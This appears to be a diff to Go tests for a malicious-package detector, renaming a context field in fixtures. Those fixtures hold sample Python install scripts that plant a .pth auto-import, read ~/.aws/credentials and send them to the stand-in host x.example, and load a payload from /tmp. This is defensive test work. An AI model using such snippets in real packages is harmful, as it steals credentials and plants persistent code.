@@ -23,7 +23,7 @@ func TestAnalyzeBadActorBehaviors_RubyGlobalInstallHook(t *testing.T) {
 func TestAnalyzeBadActorBehaviors_PythonPthAutoImport(t *testing.T) {
 	ctx := &PackageContext{
 		Ecosystem: "pypi",
-		PkgbuildContent: `from setuptools import setup
+		InstallScriptContent: `from setuptools import setup
 setup(name="x", data_files=[("lib/site-packages", ["evil.pth"])])
 # evil.pth contents: import evil; evil.run()`,
 	}
@@ -32,8 +32,8 @@ setup(name="x", data_files=[("lib/site-packages", ["evil.pth"])])
 	// detector fires when an executable import line is present in the matched
 	// region. We craft a stronger fixture to be sure the sequence matches.
 	ctx2 := &PackageContext{
-		Ecosystem: "pypi",
-		PkgbuildContent: `open(os.path.join(sitedir, "evil.pth"), "w").write("import evil; evil.run()")`,
+		Ecosystem:            "pypi",
+		InstallScriptContent: `open(os.path.join(sitedir, "evil.pth"), "w").write("import evil; evil.run()")`,
 	}
 	f2 := analyzeBadActorBehaviors(ctx2)
 	if !behHas(f2, "PY-PTH-AUTOIMPORT-PERSISTENCE") {
@@ -91,7 +91,7 @@ func TestAnalyzeBadActorBehaviors_NpmSequenceWithoutHookDoesNotFire(t *testing.T
 func TestAnalyzeBadActorBehaviors_PythonCredExfil(t *testing.T) {
 	ctx := &PackageContext{
 		Ecosystem: "pypi",
-		PkgbuildContent: `from setuptools import setup
+		InstallScriptContent: `from setuptools import setup
 import urllib.request
 data = open(os.path.expanduser("~/.aws/credentials")).read()
 urllib.request.urlopen("https://x.example/collect?d=" + data)`,
@@ -173,7 +173,7 @@ func TestAnalyzeBadActorBehaviors_NpmRemoteImportInBuildScriptDoesNotFire(t *tes
 func TestAnalyzeBadActorBehaviors_PythonImportlibExec(t *testing.T) {
 	ctx := &PackageContext{
 		Ecosystem: "pypi",
-		PkgbuildContent: `from setuptools import setup
+		InstallScriptContent: `from setuptools import setup
 import importlib.util
 spec = importlib.util.spec_from_file_location('x', '/tmp/payload.py')
 mod = importlib.util.module_from_spec(spec)
